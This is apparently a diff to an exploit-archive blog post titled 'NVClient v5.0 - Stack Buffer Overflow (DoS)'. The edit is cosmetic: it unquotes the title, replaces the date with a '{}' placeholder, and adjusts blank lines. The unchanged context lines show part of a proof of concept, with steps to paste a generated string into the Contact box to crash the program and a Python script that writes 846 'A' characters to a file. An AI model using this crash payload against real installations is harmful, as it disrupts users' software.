@@ -1,7 +1,7 @@
 ---
 layout: post
-title: "NVClient v5.0 - Stack Buffer Overflow (DoS)"
-date: 2024-05-25
+title: NVClient v5.0 - Stack Buffer Overflow (DoS)
+date: {}
 category: exploit
 ---
 
@@ -25,6 +25,8 @@ category: exploit
 # 7- Paste the characters from exploit.txt into the Contact box
 # 8- Click OK and crash!
 
+
+
 #!/usr/bin/env python3
 
 exploit = 'A' * 846
@@ -35,4 +37,3 @@ try:
     print("POC is created")
 except:
     print("POC not created")
-            
